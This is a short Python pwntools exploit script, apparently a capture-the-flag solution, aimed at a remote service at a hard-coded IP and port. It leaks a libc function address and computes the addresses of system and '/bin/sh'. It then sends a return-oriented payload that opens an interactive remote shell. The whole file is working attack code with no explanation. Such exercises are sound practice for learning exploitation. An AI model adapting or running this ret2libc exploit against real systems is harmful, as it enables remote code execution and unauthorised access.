#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Author : yuan
# https://30cm.ml

host = "140.115.59.7"
port = 11004

yuan = remote(host , port)


libc_read_offset = 0x00000000000f69a0
libc_system_offset = 0x0000000000045380
bin_sh_offset = 0x18c58b
pop_rdi_libc_offset = 0x0000000000021102

yuan.sendline("6295592")

yuan.recvuntil('x')
saddr = yuan.recvuntil('\n')
iaddr = int(saddr,16)


libc_addr = iaddr - libc_read_offset

systemaddr = libc_addr + libc_system_offset
bin_sh_addr = libc_addr + bin_sh_offset
log.success("systemaddr -> {}".format(hex(systemaddr)))
log.success("bin_sh_addr -> {}".format(hex(bin_sh_addr)))
log.success("Got a shell!")

p = p64(iaddr)*7
p += p64(0x0000000000021102 + libc_addr)
p += p64(bin_sh_addr)
p += p64(systemaddr)

yuan.sendline(p)
yuan.interactive()

